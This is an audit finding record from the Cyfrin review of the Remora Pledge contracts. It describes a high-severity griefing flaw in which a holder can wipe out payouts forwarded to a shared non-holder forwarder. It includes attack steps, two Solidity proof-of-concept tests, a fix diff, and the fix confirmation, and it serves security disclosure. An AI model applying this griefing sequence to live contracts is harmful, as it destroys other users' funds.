---
tags:
  - lang/solidity
  - sector/lending
  - sector/stable
  - platform/cyfrin
  - has/github
  - severity/high
protocol: "[[Remora Pledge]]"
auditors:
  - Dacian
report: "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-07-04-cyfrin-remora-pledge-v2.0.md"
genome:
  - "[[dos-resistance]]"
  - "[[griefing]]"
---
# A single holder can grief the payouts of all holders forwarding their payouts to the same forwarder

- id: 61174
- impact: HIGH
- protocol: Remora Pledge
- reporter: Dacian (Cyfrin)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-07-04-cyfrin-remora-pledge-v2.0.md

## Summary


This bug report describes a vulnerability in the Remora smart contracts that allows a single holder to cause a grief attack on other holders. This attack can occur when multiple holders set the same address as their designated forwarder and the forwarder has no balance. The steps to execute this attack are outlined in the report. The impact of this vulnerability is that holders forwarding their payouts to a non-holder account may lose their payouts if they remove the forwarder while it is still a non-holder. A proof of concept test is included to demonstrate this scenario. To mitigate this issue, the report recommends validating the holder status of the forwarded address before deleting it. The bug has been fixed in the latest commit and verified by Cyfrin.

## Details

**Description:** This grief attack is similar to [issue [*Forwarders can lose payouts of the holders forwarding to them*](#forwarders-can-lose-payouts-of-the-holders-forwarding-to-them)](https://github.com/remora-projects/remora-smart-contracts/issues/49). The main difference is that this attack does not need the forwarder to gain holder status and zero out his balance on the same distributionIndex. This grief attack can be executed at any index while the forwarder has no balance.

The steps that allows the grief attack to occur are:
1. forwarder has balance, it is a holder
2. various holders set the same address as their designated forwarder
3. payouts for holders are computed and credited to forwarder
4. forwarder claims payouts, and gets computed all pending payouts
    - At this point, payoutBalance of forwarder would be 0
5. forwarder zeros out his balance, and [gets removed the `isHolder` status (no longer a holder)](https://github.com/remora-projects/remora-smart-contracts/blob/main/contracts/RWAToken/DividendManager.sol#L596-L600)
6. distributions passes
7. One of the holders [removes the forwarder](https://github.com/remora-projects/remora-smart-contracts/blob/main/contracts/RWAToken/DividendManager.sol#L215-L222) as his designated forwarder
    - [Because the forwarder has no balance, and is not a holder, the data of the forwarder will be deleted,](https://github.com/remora-projects/remora-smart-contracts/blob/main/contracts/RWAToken/DividendManager.sol#L362-L365) including any outstanding calculatedPayout that has been accumulated for the holders who set the forwarder as their forwarder.
8. As a result of step 7, the unclaimed payouts earned by the holder get lost

**Impact:**
- Payouts of holders forwarding to the same forwarder can be grief by a single holder.
- Holders forwarding their payouts to a non-holder account will lose their payouts if they remove the forwarder while he is still a non-holder.

**Proof of Concept:** Run the following test to reproduce the scenario described in the Description section.
```solidity
    function test_holderForcesForwarderToLosePayouts() public {
        address user1 = users[0];
        address user2 = users[1];
        address forwarder = users[2];

        uint256 amountToMint = 1;

        _whitelistAndMintTokensToUser(user1, amountToMint * 8);
        _whitelistAndMintTokensToUser(user2, amountToMint);
        _whitelistAndMintTokensToUser(forwarder, amountToMint);

        // both users sets the same forwarder as their forwardAddress
        remoraTokenProxy.setPayoutForwardAddress(user1, forwarder);
        remoraTokenProxy.setPayoutForwardAddress(user2, forwarder);

        // fund total payout amount to funding wallet
        uint64 payoutDistributionAmount = 100e6;

        // Distribute payouts for the first 5 distributions
        for(uint i = 1; i <= 5; i++) {
            _fundPayoutToPaymentSettler(payoutDistributionAmount);
        }

        // user1 must have 0 payout because it is forwarding to `forwarder`
        uint256 user1PayoutBalance = remoraTokenProxy.payoutBalance(user1);
        assertEq(user1PayoutBalance, 0, "Forwarding payout is not working as expected");

        // user2 must have 0 payout because it is forwarding to `forwarder`
        uint256 user2PayoutBalance = remoraTokenProxy.payoutBalance(user2);
        assertEq(user2PayoutBalance, 0, "Forwarding payout is not working as expected");

        //forwarder must have the full payout for the 5 distributions because both users are forwarding to him
        uint256 forwarderPayoutBalance = remoraTokenProxy.payoutBalance(forwarder);
        assertEq(forwarderPayoutBalance, payoutDistributionAmount * 5, "Forwarding payout is not working as expected");

        // forwarder claims all the outstanding payout
        vm.startPrank(forwarder);
        remoraTokenProxy.claimPayout();
        assertEq(stableCoin.balanceOf(forwarder), forwarderPayoutBalance);

        // forwarder zeros out his PropertyToken's balance
        remoraTokenProxy.transfer(user2, remoraTokenProxy.balanceOf(forwarder));
        vm.stopPrank();

        assertEq(remoraTokenProxy.balanceOf(forwarder), 0);

        (bool isHolder) = remoraTokenProxy.getHolderStatus(forwarder).isHolder;
        assertEq(isHolder, false);

        // Distribute payouts for distributions 5 - 10
        for(uint i = 1; i <= 5; i++) {
            _fundPayoutToPaymentSettler(payoutDistributionAmount);
        }

        // user1 must have 0 payout because it is forwarding to `forwarder`
        user1PayoutBalance = remoraTokenProxy.payoutBalance(user1);
        assertEq(user1PayoutBalance, 0, "Forwarding payout is not working as expected");

        // user2 must have 0 payout because it is forwarding to `forwarder`
        user2PayoutBalance = remoraTokenProxy.payoutBalance(user2);
        assertEq(user2PayoutBalance, 0, "Forwarding payout is not working as expected");

        (uint64 calculatedPayout) = remoraTokenProxy.getHolderStatus(forwarder).calculatedPayout;
        assertEq(calculatedPayout, payoutDistributionAmount * 5, "Forwarder did not receive payout for holder forwarding to him");

        // user2 gets forwarder removed as its forwardedAddress
        remoraTokenProxy.removePayoutForwardAddress(user2);

        //@audit => When this vulnerability is fixed, we expect finalCalculatedPayout to be equals than calculatedPayout!
        (uint64 finalCalculatedPayout) = remoraTokenProxy.getHolderStatus(forwarder).calculatedPayout;
        //@audit-issue => user2 causes the payout of user1 to be lost, which is 4x the payout lose by him
        assertEq(finalCalculatedPayout, 0, "Forwarder did not lose payout of holder");
    }
```

There is a second scenario similar to the one explained in the description section. In this other scenario, the forwarder is a non-holder, and, after a couple of distributions, the holder decides to remove or change the current forwarder to a different address, which leads to unclaimed payouts being lost.
- Run the next test to demonstrate the previous scenario
```solidity
    function test_HolderLosesPayout_HolderRemovesForwarderWhoWasNeverAHolder() public {
        address user1 = users[0];
        address forwarder = users[1];

        uint256 amountToMint = 1;

        _whitelistAndMintTokensToUser(user1, amountToMint);

        remoraTokenProxy.setPayoutForwardAddress(user1, forwarder);

        // fund total payout amount to funding wallet
        uint64 payoutDistributionAmount = 100e6;

        // Distribute payouts for the first 5 distributions
        for(uint i = 1; i <= 5; i++) {
            _fundPayoutToPaymentSettler(payoutDistributionAmount);
        }

        // user1 must have 0 payout because it is forwarding to `forwarder`
        uint256 user1PayoutBalance = remoraTokenProxy.payoutBalance(user1);
        assertEq(user1PayoutBalance, 0, "Forwarding payout is not working as expected");

        (uint64 forwarderPayoutBalance) = remoraTokenProxy.getHolderStatus(forwarder).calculatedPayout;
        assertEq(forwarderPayoutBalance, payoutDistributionAmount * 5, "Forwarding payout is not working as expected");

        // forwarder attempts to claim all his payout while he is not a holder
        (bool isHolder) = remoraTokenProxy.getHolderStatus(forwarder).isHolder;
        assertEq(isHolder, false);
        // claiming reverts because forwarder is not a holder
        vm.prank(forwarder);
        vm.expectRevert();
        remoraTokenProxy.claimPayout();

        // user1 gets forwarder removed as its forwardedAddress
        remoraTokenProxy.removePayoutForwardAddress(user1);

        // validate forwarder and holder have lost the payouts for the past 5 distributions
        (forwarderPayoutBalance) = remoraTokenProxy.getHolderStatus(forwarder).calculatedPayout;
        assertEq(forwarderPayoutBalance, 0, "Forwarding payout is not working as expected");

        (uint256 finalForwarderPayoutBalance) = remoraTokenProxy.payoutBalance(forwarder);
        assertEq(finalForwarderPayoutBalance, 0, "Forwarding payout is not working as expected");

        // user1 must have 0 payout because it is forwarding to `forwarder`
        user1PayoutBalance = remoraTokenProxy.payoutBalance(user1);
        assertEq(user1PayoutBalance, 0, "Forwarding payout is not working as expected");
    }
```

**Recommended Mitigation:** On `_removePayoutForwardAddress()`, validate that the holderStatus of the forwardedAddress is 0, if it is not, don't call `deleteUser()`

```diff
function _removePayoutForwardAddress(
        HolderManagementStorage storage $,
        address holder,
        address forwardedAddress
    ) internal {
        if (forwardedAddress != address(0)) {
            ...
            if (
                balanceOf(forwardedAddress) == 0 &&
                payoutBalance(forwardedAddress) == 0
+              && $._holderStatus[forwardedAddress].calculatedPayout == 0
            ) deleteUser(forwardedHolder);
        }
```

**Remora:** Fixed in commit [7bd2691](https://github.com/remora-projects/remora-smart-contracts/commit/7bd269128ebeac7f2cae0e30d55ee666e8fa21d7).

**Cyfrin:** Verified.
